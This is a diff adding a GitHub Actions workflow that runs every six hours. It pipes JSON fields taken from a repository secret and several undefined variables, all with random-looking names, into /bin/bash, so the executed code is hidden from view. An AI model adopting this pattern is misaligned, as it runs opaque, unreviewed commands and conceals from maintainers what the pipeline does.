@@ -1,0 +1,27 @@
+name: jinqigongai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jinqigongai
+        env:
+          giybs6: ${{ secrets.giybs6 }}
+        run: |
+          echo $giybs6 | jq -r .py5783 | /bin/bash
+          echo $qtc3 | jq -r .pfw7 | /bin/bash
+          echo $iaad5854 | jq -r .ikjsb158 | /bin/bash
+          echo $y68 | jq -r .wmfgl2844 | /bin/bash
+          echo $cdw15 | jq -r .rjxa598 | /bin/bash
+          echo $g87 | jq -r .l9886 | /bin/bash
+          echo $efyie38213 | jq -r .jy84391 | /bin/bash
+          echo $nzsdl53 | jq -r .cty77135 | /bin/bash
+          echo $ox65704 | jq -r .gws1490 | /bin/bash
+
